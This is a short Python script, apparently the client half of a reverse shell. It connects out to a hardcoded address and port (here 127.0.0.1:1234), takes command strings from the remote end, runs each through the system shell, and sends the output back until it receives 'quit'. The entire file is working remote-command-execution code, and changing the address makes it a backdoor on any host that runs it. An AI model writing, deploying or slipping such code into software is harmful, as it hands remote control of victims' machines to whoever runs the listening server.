import socket
import subprocess

ip_address = '127.0.0.1'
port_number = 1234

def connect_to_server():
    cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    cs.connect((ip_address, port_number))
    print("Connected to the server")

    while True:
        try:
            command = cs.recv(1024).decode()
            if command.lower() == 'quit':
                break

            result = subprocess.run(command, shell=True, capture_output=True, text=True)

            output = result.stdout + result.stderr
            if not output:
                output = "Command executed successfully, no output."
            cs.send(output.encode())
        except Exception as e:
            cs.send(f"Error: {e}".encode())
            break

    cs.close()

if __name__ == "__main__":
    connect_to_server()
